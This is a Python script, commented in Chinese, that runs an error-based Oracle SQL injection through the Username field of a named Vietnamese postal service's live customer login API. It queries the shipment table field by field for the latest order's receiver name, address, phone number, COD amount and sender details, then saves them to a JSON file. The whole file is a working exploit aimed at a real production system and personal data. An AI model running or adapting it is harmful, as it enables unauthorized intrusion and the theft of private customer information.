#!/usr/bin/env python3
"""
EMS SQL注入 - 查询最新订单
快速获取最新一条订单的完整信息
"""

import requests
import urllib3
import json
import sys

urllib3.disable_warnings()

URL = "https://customerconnect.ems.com.vn/api/User_Customer/Login"

def sqli(query):
    """执行SQL注入查询"""
    payload = {
        "Username": f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,({query})))||'",
        "Password": "test"
    }
    
    try:
        resp = requests.post(URL, json=payload, verify=False, timeout=30)
        
        if 'thesaurus' in resp.text:
            start = resp.text.find('thesaurus ') + 10
            end = resp.text.find(' does not', start)
            if end > start:
                result = resp.text[start:end]
                return result if result else None
        return None
    except Exception as e:
        print(f"[!] 查询出错: {e}")
        return None

def get_latest_order():
    """获取最新订单"""
    print("=" * 60)
    print("🔍 正在查询最新订单...")
    print("=" * 60)
    
    # 1. 先获取最新日期
    print("\n[1/2] 获取最新订单日期...")
    latest_date = sqli("SELECT MAX(CREATE_DATE) FROM EMS.SHIPMENT")
    
    if not latest_date:
        print("[!] 无法获取最新日期")
        return
    
    print(f"✓ 最新日期: {latest_date}")
    
    # 2. 查询这个日期的第一条记录
    print(f"\n[2/2] 查询 {latest_date} 的订单详情...")
    
    # 关键字段列表
    fields = [
        ('RECEIVER_NAME', '收件人'),
        ('RECEIVER_ADDRESS', '收件地址'),
        ('RECEIVER_PHONE', '收件电话'),
        ('PRODUCT_NAME', '产品名称'),
        ('TOTAL_AMOUNT', '总金额'),
        ('WEIGHT', '重量(g)'),
        ('COD', 'COD金额'),
        ('STATUS', '状态'),
        ('CREATE_DATE', '创建日期'),
        ('SENDER_NAME', '寄件人'),
        ('SENDER_ADDRESS', '寄件地址'),
    ]
    
    order = {}
    print("")
    
    for field, label in fields:
        # 查询该日期的第一条记录
        query = f"SELECT {field} FROM (SELECT {field} FROM EMS.SHIPMENT WHERE CREATE_DATE='{latest_date}') WHERE ROWNUM=1"
        
        print(f"  查询 {label}...", end=" ", flush=True)
        value = sqli(query)
        
        if value:
            order[label] = value
            print(f"✓ {value}")
        else:
            print("✗")
    
    # 输出结果
    print("\n" + "=" * 60)
    print("📦 最新订单详情")
    print("=" * 60)
    
    for label, value in order.items():
        print(f"{label:12s}: {value}")
    
    # 保存到JSON
    output_file = f"latest_order_{latest_date}.json"
    with open(output_file, 'w', encoding='utf-8') as f:
        json.dump({
            'date': latest_date,
            'order': order,
            'total_orders': '12,618,035',
            'database': 'Oracle 11g - EMS.SHIPMENT'
        }, f, ensure_ascii=False, indent=2)
    
    print(f"\n✓ 结果已保存到: {output_file}")
    print("=" * 60)

if __name__ == "__main__":
    try:
        get_latest_order()
    except KeyboardInterrupt:
        print("\n\n[!] 用户中断")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] 错误: {e}")
        sys.exit(1)
